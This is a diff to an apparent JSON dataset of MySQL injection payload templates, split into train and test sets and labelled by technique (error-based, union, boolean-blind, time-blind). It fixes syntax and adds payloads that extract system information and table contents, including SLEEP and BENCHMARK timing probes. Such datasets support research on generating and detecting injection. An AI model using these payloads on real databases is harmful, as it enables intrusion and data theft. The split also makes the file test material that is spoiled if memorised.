@@ -15,7 +15,7 @@
     },
     {
         "technique": "error_based",
-        "payload": "' AND CAST((SELECT CONCAT('string', 'apple') AS UNSIGNED)",
+        "payload": "' AND CAST((SELECT CONCAT('string', 'apple')) AS UNSIGNED)",
         "expected_types": null,
         "reference_scope": "lor",
         "set": "test"
@@ -36,7 +36,7 @@
     },
     {
         "technique": "error_based",
-        "payload": "' AND 1=1 THEN CAST('abc' AS UNSIGNED) ELSE 0 END)",
+        "payload": "' AND 1=1 THEN CAST('abc' AS UNSIGNED) ELSE 0 END",
         "expected_types": null,
         "reference_scope": "lor",
         "set": "test"
@@ -65,6 +65,13 @@
     {
         "technique": "error_based",
         "payload": "' AND LOG2(-1)",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND EXP(3472034)",
         "expected_types": null,
         "reference_scope": "lor",
         "set": "test"
@@ -141,6 +148,13 @@
     },
     {
         "technique": "error_based",
+        "payload": "' JSON_EXTRACT('country', '$[')",
+        "expected_types": null,
+        "reference_scope": "lor",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
         "payload": "' AND GTID_SUBSET('learning',1) = 1",
         "expected_types": null,
         "reference_scope": "lor",
@@ -169,20 +183,6 @@
     },
     {
         "technique": "union_query",
-        "payload": "' ORDER BY 2",
-        "expected_types": null,
-        "reference_scope": "lor",
-        "set": "train"
-    },
-    {
-        "technique": "union_query",
-        "payload": "' ORDER BY 3",
-        "expected_types": null,
-        "reference_scope": "lor",
-        "set": "train"
-    },
-    {
-        "technique": "union_query",
         "payload": "' GROUP BY 1",
         "expected_types": null,
         "reference_scope": "lor",
@@ -190,14 +190,7 @@
     },
     {
         "technique": "union_query",
-        "payload": "' GROUP BY 2",
-        "expected_types": null,
-        "reference_scope": "lor",
-        "set": "train"
-    },
-    {
-        "technique": "union_query",
-        "payload": "' GROUP BY 3",
+        "payload": "' GROUP BY 12",
         "expected_types": null,
         "reference_scope": "lor",
         "set": "train"
@@ -211,7 +204,7 @@
     },
     {
         "technique": "union_query",
-        "payload": "' GROUP BY 1,2 HAVING 1 = 1",
+        "payload": "' AND HAVING 1 = 1",
         "expected_types": null,
         "reference_scope": "lor",
         "set": "train"
@@ -239,13 +232,6 @@
     },
     {
         "technique": "union_query",
-        "payload": "' GROUP BY 1",
-        "expected_types": null,
-        "reference_scope": "lor",
-        "set": "test"
-    },
-    {
-        "technique": "union_query",
         "payload": "' GROUP BY 2",
         "expected_types": null,
         "reference_scope": "lor",
@@ -254,13 +240,6 @@
     {
         "technique": "union_query",
         "payload": "' GROUP BY 3",
-        "expected_types": null,
-        "reference_scope": "lor",
-        "set": "test"
-    },
-    {
-        "technique": "union_query",
-        "payload": "' GROUP BY 1 HAVING 1 = 1",
         "expected_types": null,
         "reference_scope": "lor",
         "set": "test"
@@ -612,6 +591,24 @@
     },
     {
         "technique": "error_based",
+        "payload": "' UNION SELECT CAST($sysInfo$ AS CHAR)",
+        "expected_types": [
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' UNION SELECT CONCAT('', $sysInfo$)",
+        "expected_types": [
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
         "payload": "' AND ($sysInfo$)=$int$",
         "expected_types": [
             "string",
@@ -738,6 +735,24 @@
     },
     {
         "technique": "error_based",
+        "payload": "' AND JSON_VALUE($sysInfo$, '&@@')",
+        "expected_types": [
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND JSON_SET($sysInfo$, '&@@')",
+        "expected_types": [
+            "all"
+        ],
+        "reference_scope": "scr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
         "payload": "' AND GTID_SUBSET(($sysInfo$),$character$)=1",
         "expected_types": [
             "integer",
@@ -758,7 +773,7 @@
     },
     {
         "technique": "union_query",
-        "payload": "' UNION $sysInfo$",
+        "payload": "' UNION SELECT $sysInfo$",
         "expected_types": [
             "all"
         ],
@@ -767,7 +782,7 @@
     },
     {
         "technique": "union_query",
-        "payload": "' UNION ALL $sysInfo$",
+        "payload": "' UNION ALL SELECT $sysInfo$",
         "expected_types": [
             "all"
         ],
@@ -1317,6 +1332,104 @@
     },
     {
         "technique": "error_based",
+        "payload": "' AND JSON_REMOVE(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$, '^-^')",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND JSON_KEYS(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$, '^-^')",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND ST_GeomFromText(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND ST_GeomFromGeoJSON(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND UUID_TO_BIN(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "error_based",
+        "payload": "' AND JSON_SEARCH(SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$, '^-^')",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND 1=(SELECT CASE WHEN ORD(MID(IFNULL(CAST(($sysInfo$) AS NCHAR),0x20),$int$,1))>$int$ THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
+        "expected_types": [
+            "string", 
+            "integer", 
+            "integer"
+        ],
+        "reference_scope": "scr",
+        "set": "train"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND 1=(SELECT CASE WHEN ORD(MID(IFNULL(CAST((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$=$sample_t1_2$ LIMIT $int$,1) AS NCHAR),0x20),$int$,1))>$int$ THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
+        "expected_types": [
+            "all", 
+            "table", 
+            "all", 
+            "all", 
+            "integer", 
+            "integer", 
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "error_based",
         "payload": "' AND GTID_SUBSET((SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$),$int$) = 1",
         "expected_types": [
             "number",
@@ -1337,6 +1450,66 @@
         ],
         "reference_scope": "tsr",
         "set": "train"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT COUNT(*) FROM $table_1$",
+        "expected_types": [
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT MIN($column_t1_1$) FROM $table_1$",
+        "expected_types": [
+            "all",
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT MAX($column_t1_1$) FROM $table_1$",
+        "expected_types": [
+            "all",
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT (SELECT $column_t1_1$ FROM $table_1$ LIMIT 1)",
+        "expected_types": [
+            "all",
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT d.v FROM (SELECT $column_t1_1$ AS v FROM $table_1$) AS d",
+        "expected_types": [
+            "all",
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+
+    {
+        "technique": "union_query",
+        "payload": "' UNION SELECT COUNT(DISTINCT $column_t1_1$) FROM $table_1$",
+        "expected_types": [
+            "all",
+            "table"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
     },
     {
         "technique": "union_query",
@@ -1838,7 +2011,7 @@
     },
     {
         "technique": "time_blind",
-        "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$",
+        "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$)",
         "expected_types": [
             "integer",
             "all",
@@ -1852,7 +2025,7 @@
     },
     {
         "technique": "time_blind",
-        "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$",
+        "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$)",
         "expected_types": [
             "integer",
             "all",
@@ -1866,7 +2039,7 @@
     },
     {
         "technique": "time_blind",
-        "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $character$",
+        "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $character$)",
         "expected_types": [
             "integer",
             "string",
@@ -1926,7 +2099,7 @@
     },
     {
         "technique": "time_blind",
-        "payload": "' AND (SELECT BENCHMARK(1000000,MD5(1)) WHERE SUBSTR(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1,1) IN ('a','e','i','o','u')",
+        "payload": "' AND (SELECT BENCHMARK(1000000,MD5(1)) WHERE SUBSTR(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1,1) IN ('a','e','i','o','u'))",
         "expected_types": [
             "string",
             "table",
